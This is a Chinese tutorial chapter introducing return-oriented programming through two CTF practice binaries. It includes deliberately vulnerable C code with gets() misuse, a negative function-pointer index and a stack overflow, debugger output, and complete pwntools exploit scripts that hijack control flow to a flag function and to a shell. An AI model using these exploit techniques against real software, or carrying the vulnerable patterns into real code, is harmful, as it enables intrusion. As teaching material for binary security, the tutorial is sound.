# 1.3.1 ROP 介绍

>   ROP，即 return oriented programming（返回导向编程），关键在于劫持程序控制流后，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。

## 控制流劫持

>   在二进制安全中，大部分的漏洞利用方式是劫持控制流，接着使程序按照攻击者的攻击思路运行下去。控制流劫持是一种危害性极大的攻击方式，攻击者能够通过它来获取目标机器的控制权，甚至进行提权操作，对目标机器进行全面控制。当攻击者掌握了被攻击程序的内存错误漏洞后，一般会考虑发起控制流劫持攻击。
>
>   控制流的劫持意味着攻击者劫持了 PC（program counter）寄存器，从存在漏洞的程序到控制流劫持也是 pwn 的重点，实现这一目标的方法有很多，但总是离不开跳转（包括函数返回、函数指针的调用等）。

### 例题 chp1-0-hellopwner

先来看一个简单的例子，这也是本章真正意义上的第一道 pwn 题（见[附件文件夹-chp1-0-hellopwner](../attachments/chp1-0)）：

>   读者可以尝试先不看源码，把 elf 文件拖到 ida64 中试试能不能自己找到漏洞所在。
>
>   这里给一点提示：这个程序中有不只一处漏洞，读者可以关注：`对读入的字符串处理不当导致的缓冲区溢出` 以及 `对整数处理不当导致的负数溢出`。

回到这个例子中，由于编译时采用了 `-static -no-pie` 的选项，因此地址都是固定的，这无疑给我们的利用带来了很大的便利：利用漏洞劫持控制流时，可以直接来到目标函数处，而不需要额外的手段去泄露程序地址和 libc 地址。

而主要漏洞出现在 get_a_num 函数中：

```c
__int64 get_a_num()
{
  gets(input);
  return atoi(input);
}
```

这里需要注意的一点是，gets 函数往往是造成缓冲区溢出的罪魁祸首，它在遇到字符串中的 `\x00` 等字符时并不会停下，而会一直向缓冲区中读入数据直到换行符的出现。

以及 run 函数中：

```c
// ...
int cmd;
// ...
cmd = get_a_num();
// ...
return ((__int64 (__fastcall *)(__int64, _QWORD, _QWORD))cmdtb[cmd])(buf_0, v17, v15);
```

也就是说这里 cmd 是一个 int 类型，可以为负数，这就导致了调用函数指针 `cmdtb[cmd]()` 时能调用它前面的缓冲区上，来到 .bss 段上发现 cmdtb 前面正是上面 gets 的缓冲区：

```sh
.bss:00000000004C4300                 public input
.bss:00000000004C4300 ; u32 input[64]
.bss:00000000004C4300 input           dd 40h dup(?)           ; DATA XREF: get_a_num+8↑o
.bss:00000000004C4300                                         ; get_a_num+19↑o
.bss:00000000004C4400                 public cmdtb
.bss:00000000004C4400 ; __int64 cmdtb[]
.bss:00000000004C4400 cmdtb           dq ?
```

于是很自然地可以想到，用 get_a_num 控制输入，用 cmdtb 对函数指针的调用去劫持程序控制流。

回到函数列表中，发现本道例题设计时提供了一个名为 flag1 的函数但是并没有被调用，那我们只需要按照上述思路劫持控制流到 flag1 的地址即可，exp_flag1.py 如下：

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc
i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")
def cmd(data):
    ru(b'cmd> ')
    sl(data)
def call_func(data, idx, key=b""):
    cmd(data)
    ru(b'offset: ')
    sl(i2b(idx))
    if data[:2] == b"1\x00":
        ru(b'data: ')
        sl(key)

call_func(b"-31\x00".ljust(8, b"\x00") + p64(elf.symbols["flag1"]), 0)
ia()
```

读者也可以跟着 gdb 调试一下，把断点设置在 `0x401f36 <run+189>    call   r8` 的地方，就可以看到程序的 rip 寄存器确实被劫持到了 flag1 函数的地方继续执行。

>   当然这不是这道题的全部，读者也可以考虑：我们能否利用其它办法，完全获取这个程序的控制权，让它运行我们的恶意代码（shellcode）呢？

---

## ret2text

>   经过上面的例子，读者已经初步了解了程序的执行流程是怎么回事，接下来回到本章主题 ROP 上。

rop 中的 R 代表 return，即函数返回时调用的汇编语句 ret，读者不妨结合 [0.4 程序是怎么运行的](../0.准备工作/0.4.elf.md) 中对函数调用机制的介绍来进行思考：既然函数返回地址是存放在栈上的，若攻击者通过程序漏洞在函数里面修改了该函数的返回地址会发生什么？

下面给出例题，读者不妨构造不同的输入，结合调试进行思考：

### 例题 chp1-1-ret2text

例题代码很简单，这里给出源码：

```c
// compiled with: gcc -no-pie -fno-stack-protector ./ret2text.c -o ./ret2text
// author: @eastXueLian
// date:   2023-03-25

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void gift() {
    asm("pop %rax");
    system("/bin/sh");
}
int main() {
    char buf[0x20];
    puts("Give me your data: ");
    read(0, buf, 0x100);
    return 0;
}
```

值得注意的是，这里编译时选项 -no-pie 关闭了地址随机化的保护，-fno-stack-protector 选项关闭了栈上 canary 的保护，这免除了我们泄露地址和 canary 的麻烦。

main 函数中是存在栈溢出漏洞的：栈上缓冲区 buf 长度为 0x20，而接下来用 read 函数读入了 0x100 个字节的内容，可以使用 gdb 进行调试，随便敲几个 a 进去，得到程序读取输入后栈布局如下：

```sh
pwndbg> stack
00:0000│ rsi rsp 0x7ffd7906b370 ◂— 'aaaaaaaaaa\n'
01:0008│         0x7ffd7906b378 ◂— 0xa6161 /* 'aa\n' */
02:0010│         0x7ffd7906b380 —▸ 0x7ffd7906b480 ◂— 0x1
03:0018│         0x7ffd7906b388 ◂— 0x0
04:0020│ rbp     0x7ffd7906b390 ◂— 0x0
05:0028│         0x7ffd7906b398 —▸ 0x7fe443e13083 (__libc_start_main+243) ◂— mov    edi, eax
06:0030│         0x7ffd7906b3a0 —▸ 0x7fe44402e620 (_rtld_global_ro) ◂— 0x50f5500000000
```

上面 rsi 和栈顶指针 rsp 都指向 buf 的起始地址，栈底指针 rbp 指向 rsp+0x20 的位置，而 rbp 再下面一个位置明显指向一段代码，这就是返回地址了。

>   函数中局部变量大小为 0x20 个字节，而返回地址却在 rsp+0x28 的位置，那 rsp+0x20 的位置，即 rbp 现在所指的位置上放着什么？
>
>   事实上，这个位置是存放上个函数 rbp 的，这在章节 0.4 中已经有所介绍，对此感到疑惑的同学可以参考前面的内容来理解栈帧的结构。
>
>   由于 main 函数此时是程序中调用的第一个有完整栈帧结构的函数，因此 rbp 所指内存地址上的值是 0.

本例中我们使用一些字符来占位，最终实现修改函数返回地址的目标，exp.py 如下：

```py
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(elf.symbols['gift'])
s(payload)

ia()
```

可以进行调试，发现 read 过后栈上布局如下：

```sh
│pwndbg> stack
00:0000│ rsi rsp 0x7ffd5ad25db0 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓            4 skipped
05:0028│         0x7ffd5ad25dd8 —▸ 0x401176 (gift) ◂— endbr64
06:0030│         0x7ffd5ad25de0 —▸ 0x7f74b9060620 (_rtld_global_ro) ◂— 0x50f5500000000
```

可以看到返回地址已经成功被覆盖为 gift 函数的地址，继续运行即可劫持程序执行流程到 gift 函数中，最终 getshell.

上面我们劫持控制流，使程序返回到代码段已有函数的技巧也被称作 ret2text.

---